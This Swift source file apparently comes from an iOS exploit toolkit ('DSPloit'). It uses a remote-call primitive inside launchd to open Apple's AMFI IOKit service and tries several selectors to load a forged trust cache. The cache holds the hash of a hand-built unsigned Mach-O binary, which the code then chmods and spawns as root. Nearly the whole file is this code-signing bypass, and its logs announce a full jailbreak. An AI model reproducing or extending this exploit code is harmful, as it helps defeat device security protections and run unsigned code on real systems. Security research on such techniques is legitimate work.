//
//  exp_launchd_tc_load.swift
//  DSPloit
//
//  Load trust cache via launchd RC + IOKit AMFI (fully async, no deadlock)
//

import Foundation
import UIKit
import CommonCrypto

final class ExpLaunchdTCLoad {
    static let shared = ExpLaunchdTCLoad()
    
    /// Callback to append log lines to UI in real-time
    var onLog: ((String) -> Void)?
    
    private func log(_ msg: String) {
        onLog?(msg)
        globallogger.log("(exp_launchd_tc) \(msg)")
    }
    
    /// Run fully async — results delivered via onLog callback
    func runAsync() {
        #if !DISABLE_REMOTECALL
        guard dspmgr.shared.dsready, dspmgr.shared.rcready else {
            log("❌ Need KRW + RC active")
            return
        }
        
        log("── launchd Trust Cache Load ──")
        log("iOS \(UIDevice.current.systemVersion)")
        log("")
        
        // Step 1
        log("[1/5] Building trust cache...")
        let testBin = buildTestBinary()
        let cdhash = sha256Truncated(testBin)
        let tcData = buildTC(cdhash: cdhash)
        log("CDHash: \(cdhash.map { String(format: "%02x", $0) }.joined())")
        log("TC: \(tcData.count) bytes")
        
        // Step 2
        log("")
        log("[2/5] Writing files...")
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
        let binPath = docs + "/launchd_test"
        
        do {
            try testBin.write(to: URL(fileURLWithPath: binPath))
            log("✅ Files written")
        } catch {
            log("❌ Write failed: \(error.localizedDescription)")
            return
        }
        
        // Step 3: Use launchd RC (async, no semaphore)
        log("")
        log("[3/5] Connecting to launchd (async)...")
        
        RootExecutor.shared.executeAsRoot(operation: "tc_iokit") { [weak self] rc in
            guard let self else { return (false, "self nil", 0) }
            
            let RTLD_DEFAULT = UInt64(bitPattern: -2)
            let mem = rc.trojanMem
            
            // Probe IOKit functions
            let ioMatching = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceMatching"))
            let ioGetMatch = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceGetMatchingService"))
            let ioOpen = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceOpen"))
            let ioCall = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOConnectCallStructMethod"))
            let taskSelfPtr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "mach_task_self_"))
            
            guard ioMatching != 0 && ioGetMatch != 0 && ioOpen != 0 else {
                return (false, "IOKit not found", 0)
            }
            
            // IOServiceMatching("AppleMobileFileIntegrity")
            let amfiStr = remote_alloc_str(rc, "AppleMobileFileIntegrity")
            let matching = RootExecutor.rcallAddr(rc, ioMatching, amfiStr)
            guard matching != 0 else {
                return (false, "IOServiceMatching=NULL", 0)
            }
            
            // IOServiceGetMatchingService
            let service = RootExecutor.rcallAddr(rc, ioGetMatch, 0, matching)
            guard service != 0 else {
                return (false, "AMFI service=0", 0)
            }
            
            // Get task self
            var taskSelf: UInt64 = 0x103
            if taskSelfPtr != 0 {
                let val = rc[taskSelfPtr].value32()
                if val != 0 { taskSelf = UInt64(val) }
            }
            
            // IOServiceOpen
            let connAddr = mem + 0x2800
            rc[connAddr].setValue32(0)
            let kr = RootExecutor.rcallAddr(rc, ioOpen, service, taskSelf, 0, connAddr)
            let conn = rc[connAddr].value32()
            
            guard kr == 0 && conn != 0 else {
                return (false, "IOServiceOpen kr=0x\(String(kr, radix: 16)) conn=\(conn)", UInt64(kr))
            }
            
            // IOConnectCallStructMethod — try selectors
            var successSel: Int = -1
            if ioCall != 0 {
                let tcBuf = mem + 0x3000
                tcData.withUnsafeBytes { buf in
                    rc.remote_write(tcBuf, from: buf.baseAddress!, size: UInt64(tcData.count))
                }
                let outBuf = mem + 0x4000
                let outSize = mem + 0x4800
                
                for sel: UInt32 in 0..<8 {
                    rc[outSize].setValue64(256)
                    let r = RootExecutor.rcallAddr(rc, ioCall,
                        UInt64(conn), UInt64(sel), tcBuf, UInt64(tcData.count), outBuf, outSize)
                    if r == 0 {
                        successSel = Int(sel)
                        break
                    }
                }
            }
            
            // Try posix_spawn
            let pathAddr = remote_alloc_str(rc, binPath)
            RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
            let pidAddr = mem + 0xA00
            rc[pidAddr].setValue32(0)
            let argv = mem + 0xA10
            rc[argv].setValue64(pathAddr)
            rc[argv + 8].setValue64(0)
            let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
            let pid = rc[pidAddr].value32()
            RootExecutor.rcall(rc, "free", pathAddr)
            
            let msg = "svc=0x\(String(service, radix: 16)) conn=\(conn) sel=\(successSel) spawn=\(spawnRet) pid=\(pid)"
            let ok = (spawnRet == 0 && pid != 0)
            return (ok, msg, UInt64(pid))
        }
        
        // Poll for result (non-blocking)
        pollResult(operation: "tc_iokit", attempt: 0)
        
        #else
        log("❌ DISABLE_REMOTECALL")
        #endif
    }
    
    /// Synchronous wrapper for old-style call (returns empty, logs via onLog)
    func runAll() -> [String] {
        var collected: [String] = []
        onLog = { collected.append($0) }
        
        // Can't run async from runAll synchronously — just return instructions
        collected.append("── launchd Trust Cache Load ──")
        collected.append("⚠️ Use the async button in ExperimentsView")
        collected.append("   (runAll is deprecated for this experiment)")
        return collected
    }
    
    private func pollResult(operation: String, attempt: Int) {
        guard attempt < 30 else {
            log("❌ Timeout waiting for launchd")
            return
        }
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) { [weak self] in
            guard let self else { return }
            
            if let result = RootExecutor.shared.lastResult, result.operation == operation {
                // Got result
                self.log("")
                self.log("[4/5] IOKit result:")
                self.log("   \(result.message)")
                
                if result.success {
                    self.log("")
                    self.log("✅✅✅ UNSIGNED BINARY SPAWNED! PID=\(result.returnValue)")
                    self.log("🎉 FULL JAILBREAK ACHIEVED!")
                } else {
                    self.log("")
                    self.log("❌ Not yet working: \(result.message)")
                    self.log("   Need correct IOKit selector for TC load")
                }
            } else if RootExecutor.shared.isExecuting {
                // Still running
                if attempt == 5 { self.log("   ⏳ Waiting for launchd...") }
                self.pollResult(operation: operation, attempt: attempt + 1)
            } else {
                // Finished but no matching result
                self.log("❌ launchd operation did not complete")
            }
        }
    }
    
    // MARK: - Helpers
    
    private func sha256Truncated(_ data: Data) -> Data {
        var hash = [UInt8](repeating: 0, count: Int(CC_SHA256_DIGEST_LENGTH))
        data.withUnsafeBytes { CC_SHA256($0.baseAddress, CC_LONG(data.count), &hash) }
        return Data(hash.prefix(20))
    }
    
    private func buildTC(cdhash: Data) -> Data {
        var tc = Data()
        var version: UInt32 = 2
        tc.append(Data(bytes: &version, count: 4))
        var uuid = UUID().uuid
        tc.append(Data(bytes: &uuid, count: 16))
        var count: UInt32 = 1
        tc.append(Data(bytes: &count, count: 4))
        tc.append(cdhash)
        tc.append(contentsOf: [2, 0, 0, 0])
        return tc
    }
    
    private func buildTestBinary() -> Data {
        var bin = Data()
        let header: [UInt8] = [
            0xCF, 0xFA, 0xED, 0xFE, 0x0C, 0x00, 0x00, 0x01,
            0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
            0x02, 0x00, 0x00, 0x00, 0x60, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ]
        bin.append(contentsOf: header)
        var seg = [UInt8](repeating: 0, count: 72)
        seg[0] = 0x19; seg[4] = 0x48
        seg[8] = 0x5F; seg[9] = 0x5F; seg[10] = 0x54; seg[11] = 0x45; seg[12] = 0x58; seg[13] = 0x54
        seg[28] = 0x01; seg[32] = 0x00; seg[33] = 0x40; seg[40] = 0x00; seg[41] = 0x40
        seg[48] = 0x05; seg[52] = 0x05
        bin.append(contentsOf: seg)
        var thread = [UInt8](repeating: 0, count: 280)
        thread[0] = 0x05; thread[4] = 0x18; thread[5] = 0x01; thread[8] = 0x06; thread[12] = 0x44
        thread[272] = 0x80; thread[273] = 0x01; thread[276] = 0x01
        bin.append(contentsOf: thread)
        while bin.count < 0x180 { bin.append(0) }
        bin.append(contentsOf: [0x00, 0x00, 0x80, 0xD2, 0x30, 0x00, 0x80, 0xD2, 0x01, 0x10, 0x00, 0xD4])
        while bin.count < 0x4000 { bin.append(0) }
        return bin
    }
}
